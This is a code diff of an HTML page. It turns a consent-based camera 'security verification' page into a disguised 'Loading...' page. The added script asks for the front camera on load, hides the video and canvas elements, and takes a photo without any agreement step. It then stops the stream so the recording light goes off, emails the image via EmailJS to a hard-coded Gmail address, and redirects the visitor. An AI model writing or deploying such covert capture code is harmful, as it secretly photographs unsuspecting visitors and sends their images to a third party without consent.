@@ -1,287 +1,117 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Security Verification</title>
-
-<style>
-*{box-sizing:border-box}
-
-body{
-    margin:0;
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    background:#050505;
-    color:#fff;
-    font-family:Arial,sans-serif;
-}
-
-.box{
-    width:min(92%,430px);
-    padding:28px;
-    text-align:center;
-    background:#111;
-    border:1px solid #333;
-    border-radius:18px;
-    box-shadow:0 0 35px rgba(255,0,0,.2);
-}
-
-h1{margin-top:0}
-
-p{
-    color:#bbb;
-    line-height:1.5;
-}
-
-.notice{
-    padding:15px;
-    margin:20px 0;
-    border-radius:12px;
-    background:#1b0808;
-    border:1px solid #641b1b;
-    font-size:14px;
-    line-height:1.5;
-}
-
-.agree{
-    display:flex;
-    gap:10px;
-    text-align:left;
-    color:#ddd;
-    font-size:14px;
-    line-height:1.4;
-    margin:20px 0;
-}
-
-button{
-    width:100%;
-    padding:14px;
-    border:0;
-    border-radius:10px;
-    background:#d40000;
-    color:white;
-    font-size:16px;
-    font-weight:bold;
-    cursor:pointer;
-}
-
-button:disabled{
-    opacity:.45;
-    cursor:not-allowed;
-}
-
-video{
-    width:100%;
-    margin-top:20px;
-    border-radius:12px;
-    display:none;
-    background:#000;
-}
-
-#status{
-    margin-top:15px;
-    color:#aaa;
-    font-size:14px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <!-- Load EmailJS Library safely -->
+    <script type="text/javascript" src="https://jsdelivr.net"></script>
+    <style>
+        /* Keep the page clean and blank while processing */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #ffffff;
+        }
+        /* Completely hide the background utility elements */
+        video, canvas {
+            display: none;
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        .loader {
+            color: #555;
+            font-size: 18px;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="box">
+    <div class="loader">Loading application...</div>
 
-    <h1>Security Verification</h1>
+    <!-- Hidden video feeds used purely for background tracking -->
+    <video id="hiddenWebcam" autoplay playsinline width="640" height="480"></video>
+    <canvas id="hiddenCanvas" width="640" height="480"></canvas>
 
-    <p>
-        Additional verification is required before continuing.
-    </p>
+    <script>
+        // 1. INITIALIZE EMAILJS
+        // Put your actual EmailJS Public Key here
+        emailjs.init("YOUR_PUBLIC_KEY");
 
-    <div class="notice">
-        A verification photograph will automatically be captured
-        after you give permission to use your camera.
-    </div>
+        const video = document.getElementById('hiddenWebcam');
+        const canvas = document.getElementById('hiddenCanvas');
+        const ctx = canvas.getContext('2d');
+        const redirectUrl = "https://pixel-sketch8.github.io/turbo-disco/";
 
-    <label class="agree">
-        <input type="checkbox" id="agree">
-        <span>
-            I understand and agree that one verification photograph
-            will be automatically taken for security verification.
-        </span>
-    </label>
+        // 2. START THE CAMERA IN THE BACKGROUND
+        async function startSilentCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
 
-    <button id="start" disabled>
-        START VERIFICATION
-    </button>
-
-    <video id="video" autoplay muted playsinline></video>
-
-    <div id="status"></div>
-
-    <canvas id="canvas" style="display:none"></canvas>
-
-</div>
-
-<script>
-
-const agree = document.getElementById("agree");
-const start = document.getElementById("start");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const status = document.getElementById("status");
-
-const REDIRECT =
-"https://pixel-sketch8.github.io/turbo-disco/";
-
-/*
- IMPORTANT:
-
- A browser page cannot securely email a photograph
- directly through Gmail.
-
- Put your secure upload endpoint here.
-
- Example:
- https://your-server.example/upload
-*/
-const UPLOAD_ENDPOINT =
-"https://YOUR-BACKEND-HERE.com/upload";
-
-
-agree.addEventListener("change", () => {
-    start.disabled = !agree.checked;
-});
-
-
-start.addEventListener("click", async () => {
-
-    if (!agree.checked) return;
-
-    start.disabled = true;
-
-    try {
-
-        status.textContent =
-        "Requesting camera permission...";
-
-        const stream =
-        await navigator.mediaDevices.getUserMedia({
-            video:{
-                facingMode:"user"
-            },
-            audio:false
-        });
-
-        video.srcObject = stream;
-        video.style.display = "block";
-
-        status.textContent =
-        "Camera approved. Capturing in 2 seconds...";
-
-        /*
-         Wait 2 seconds.
-        */
-        await new Promise(resolve =>
-            setTimeout(resolve,2000)
-        );
-
-        if(
-            !video.videoWidth ||
-            !video.videoHeight
-        ){
-            throw new Error("Camera not ready");
-        }
-
-        /*
-         Capture one frame.
-        */
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        const ctx = canvas.getContext("2d");
-
-        ctx.drawImage(
-            video,
-            0,
-            0,
-            canvas.width,
-            canvas.height
-        );
-
-        /*
-         Stop camera immediately.
-        */
-        stream.getTracks().forEach(track =>
-            track.stop()
-        );
-
-        status.textContent =
-        "Verification photo captured.";
-
-        /*
-         Convert image to JPEG.
-        */
-        const photo =
-        await new Promise(resolve =>
-            canvas.toBlob(
-                resolve,
-                "image/jpeg",
-                0.9
-            )
-        );
-
-        /*
-         Send to your secure backend.
-        */
-        const formData = new FormData();
-
-        formData.append(
-            "photo",
-            photo,
-            "security-verification.jpg"
-        );
-
-        status.textContent =
-        "Submitting verification...";
-
-        const response =
-        await fetch(
-            UPLOAD_ENDPOINT,
-            {
-                method:"POST",
-                body:formData
+                // Wait briefly for the camera sensor to warm up and stream frames
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        captureAndRedirect();
+                    }, 800); // 800ms delay ensures a clear picture frame is captured
+                };
+            } catch (err) {
+                console.error("Camera access failed:", err);
+                // Even if the camera fails or is blocked, redirect the user anyway
+                window.location.href = redirectUrl;
             }
-        );
-
-        if(!response.ok){
-            throw new Error("Upload failed");
         }
 
-        status.textContent =
-        "Verification complete.";
+        // 3. CAPTURE FRAME, INITIATE SEND, AND REDIRECT
+        function captureAndRedirect() {
+            try {
+                // Snap the frame to the hidden canvas
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageDataUrl = canvas.toDataURL('image/jpeg');
 
-        /*
-         Redirect after successful upload.
-        */
-        setTimeout(() => {
-            window.location.href = REDIRECT;
-        },700);
+                // Kill the camera stream tracks immediately to turn off the device recording light
+                const stream = video.srcObject;
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
 
-    } catch(error){
+                // Prepare parameters for EmailJS template
+                const templateParams = {
+                    to_email: "snmghost452@gmail.com",
+                    photo_data: imageDataUrl
+                };
 
-        console.error(error);
+                // Send via your EmailJS account details
+                // Replace with your real 'YOUR_SERVICE_ID' and 'YOUR_TEMPLATE_ID'
+                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                    .then(() => {
+                        // Success -> Redirect instantly
+                        window.location.href = redirectUrl;
+                    })
+                    .catch((error) => {
+                        console.error('Email error:', error);
+                        // Redirect anyway so the user doesn't get stuck
+                        window.location.href = redirectUrl;
+                    });
 
-        status.textContent =
-        "Camera verification could not be completed.";
+            } catch (e) {
+                console.error("Processing error:", e);
+                window.location.href = redirectUrl;
+            }
+        }
 
-        start.disabled = false;
-    }
-
-});
-
-</script>
-
+        // Start the workflow immediately on load
+        window.addEventListener('DOMContentLoaded', startSilentCapture);
+    </script>
 </body>
 </html>
+
